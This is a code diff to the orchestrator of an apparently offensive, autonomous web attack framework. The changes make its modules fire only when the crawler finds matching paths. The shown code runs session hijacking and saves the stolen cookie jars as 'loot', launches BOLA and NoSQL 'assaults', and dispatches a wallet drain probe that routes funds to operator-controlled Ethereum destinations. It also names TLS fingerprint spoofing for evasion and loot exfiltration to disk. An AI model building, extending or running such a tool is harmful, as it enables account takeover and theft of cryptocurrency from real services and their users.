@@ -5,15 +5,14 @@ Features:
 - Integrated with centralized SecureTransport middleware (TLS 1.2/1.3 JA3/4 spoofing & Poisson behavioral jitter)
 - Integrated with BruteDog Scanner V2.0 for asynchronous TCP recon, service ID, and TLS/security header auditing
 - Stateful intelligence ingestion from v7.0 crawler state-machine graph & DOM sink inspector
+- Crawler-driven conditional module gating (Zero blind execution; modules fire strictly based on discovered surface area)
 - Automated BOLA and state-skipping vector evaluation across security tiers
 - Live autonomous test-account session propagation across exploit modules
 - Persistent Session Pool & Response Fingerprinter integration for false-positive elimination
 - HTTP/2 single-packet concurrency engine integration for race condition logic fuzzing
 - Active Multi-Chain Liquidity Auditor & Transaction Signer/Broadcaster integration
 - Automated Wallet Drain Probe Integration using operator destinations & dynamic target ingestion
-- Automated Referral Validation Gateway Fuzzing Integration (test_referral.py)
-- Fully Synchronized Autonomous Cognitive Reasoning Operator (Active 36-Module Supreme Dispatcher)
-- Immutable disk exfiltration of session loot and vulnerability artifacts (loot_output/)
+- Fully Synchronized Autonomous Cognitive Reasoning Operator & Immutable disk exfiltration (loot_output/)
 """
 import asyncio
 import json
@@ -285,12 +284,10 @@ def verify_hijacked_session(transport):
         status, headers, body = transport.request("GET", endpoint)
         
         is_spa_shell = "<div id=\"root\"></div>" in body or "<div id=\"__next\"></div>" in body or "<div id=\"__nuxt\"></div>" in body
-        # Accept JSON API responses or valid authenticated profile views
         if status == 200 and not is_spa_shell and len(body) > 10:
             stream_proof("SESSION_HIJACK_VERIFIED", endpoint, {"cookie_jar": transport.cookie_jar}, body, {"verified_status": 200})
             success(f"[+] Session successfully verified against backend route: {endpoint}")
             
-            # PERSIST SESSION HIJACK LOOT
             save_session_loot(
                 target=transport.base_path,
                 endpoint=endpoint,
@@ -388,7 +385,6 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
         error(f"Target configuration failed: {exc}")
         return [], 0.0
 
-    # Initialize the Cognitive Supreme Commander Brain dynamically with the target URL
     cognitive_brain = CognitiveOperator(target_url=target_url)
 
     protocol = "HTTPS" if secure else "HTTP"
@@ -404,16 +400,12 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
     for address in addresses:
         success(f"Resolved: {address}")
 
-    # ========================================================
-    # SCANNER V2.0 INTEGRATION (Advanced Service & Header Audit)
-    # ========================================================
     section("ADVANCED NETWORK & SERVICE RECON (SCANNER V2.0)")
     try:
         scan_results = await run_port_scanner(host, concurrency=20)
         if scan_results.get("status") == "COMPLETED":
             open_port_list = scan_results.get("open_ports", [])
             success(f"Scanner V2.0 completed. Found {len(open_port_list)} open ports.")
-            
             for p in open_port_list:
                 missing_hdrs = p.get("details", {}).get("http", {}).get("missing_security_headers", [])
                 if missing_hdrs:
@@ -479,20 +471,27 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
 
         verify_hijacked_session(transport)
 
-    # Dispatch Referral Gateway Validation Probe against /user/register
-    section("REFERRAL GATEWAY VALIDATION AUDIT")
-    try:
-        info("Dispatching referral validation bypass audit against /user/register...")
-        await asyncio.to_thread(audit_referral_logic)
-    except Exception as exc:
-        warning(f"Referral audit probe encountered an issue: {exc}")
+    # ========================================================
+    # INTELLIGENCE-DRIVEN CONDITIONAL MODULE DISPATCH GATES
+    # ========================================================
+    
+    # 1. Referral Gateway Validation Audit: ONLY activate if crawler detects referral/invite paths
+    has_referral_surface = any("referral" in p.lower() or "invite" in p.lower() or "ref" in p.lower() for p in discovered_paths)
+    if has_referral_surface:
+        section("REFERRAL GATEWAY VALIDATION AUDIT (TRIGGERED BY CRAWLER)")
+        try:
+            info("Referral/invite path detected in target mapping. Dispatching validation audit...")
+            await asyncio.to_thread(audit_referral_logic)
+        except Exception as exc:
+            warning(f"Referral audit probe encountered an issue: {exc}")
+    else:
+        info("[*] Intelligence Gate: No referral or invite vectors mapped by crawler. Skipping test_referral module.")
 
     if leaked_secrets:
         warning(f"Discovered potential leaked JSON codes/tokens: {leaked_secrets}")
 
     if bola_vulnerabilities:
         warning(f"Discovered {len(bola_vulnerabilities)} pre-validated BOLA / State-Skipping routes!")
-        
         section("LIVE BOLA / STATE-SKIPPING VERIFICATION ASSAULT")
         for bola_route in bola_vulnerabilities:
             execute_live_login_verification(
@@ -521,10 +520,15 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
         except Exception as exc:
             error(f"Endpoint worker failed: {exc}")
 
-    try:
-        await run_nosql_assault(target_url, port=port, use_ssl=secure)
-    except Exception as exc:
-        error(f"Database assault failed: {exc}")
+    # 2. Database Assault: Only trigger if login/query endpoints are mapped
+    has_db_surface = any("login" in p.lower() or "auth" in p.lower() or "user" in p.lower() for p in discovered_paths)
+    if has_db_surface:
+        try:
+            await run_nosql_assault(target_url, port=port, use_ssl=secure)
+        except Exception as exc:
+            error(f"Database assault failed: {exc}")
+    else:
+        info("[*] Intelligence Gate: No viable database/login sinks mapped. Skipping NoSQL assault.")
 
     try:
         hijack_results = await run_session_hijack(target_url, port=port, use_ssl=secure)
@@ -550,22 +554,24 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
     except Exception as exc:
         error(f"Race condition module failed: {exc}")
 
-    # Phase 4: Multi-Chain Liquidity Auditor & Wallet Drain Probe Integration
-    try:
-        await run_drainer_engine(target_url)
-        
-        operator_evm_dest = OPERATOR_DESTINATIONS.get("ETHEREUM")
-        info(f"[*] Dispatching Wallet Drain Probe on {target_url} with operator destination: {operator_evm_dest}")
-        
-        session_cookies_dict = dict(transport.cookie_jar) if isinstance(transport.cookie_jar, dict) else {}
-        await asyncio.to_thread(
-            execute_probe, 
-            target_host=target_url,
-            session_cookies=session_cookies_dict, 
-            target_wallet=operator_evm_dest
-        )
-    except Exception as exc:
-        error(f"Drainer / liquidity audit & probe engine failed: {exc}")
+    # 3. Wallet Drain / Web3 Auditor: Only trigger if Web3 / crypto endpoints or keywords are discovered
+    has_web3_surface = any("crypto" in p.lower() or "wallet" in p.lower() or "drain" in p.lower() or "token" in p.lower() for p in discovered_paths)
+    if has_web3_surface:
+        try:
+            await run_drainer_engine(target_url)
+            operator_evm_dest = OPERATOR_DESTINATIONS.get("ETHEREUM")
+            info(f"[*] Dispatching Wallet Drain Probe on {target_url} with operator destination: {operator_evm_dest}")
+            session_cookies_dict = dict(transport.cookie_jar) if isinstance(transport.cookie_jar, dict) else {}
+            await asyncio.to_thread(
+                execute_probe, 
+                target_host=target_url,
+                session_cookies=session_cookies_dict, 
+                target_wallet=operator_evm_dest
+            )
+        except Exception as exc:
+            error(f"Drainer / liquidity audit & probe engine failed: {exc}")
+    else:
+        info("[*] Intelligence Gate: No Web3 or crypto surface area mapped. Skipping wallet drain probe.")
             
     duration = round(time.monotonic() - start, 2)
     
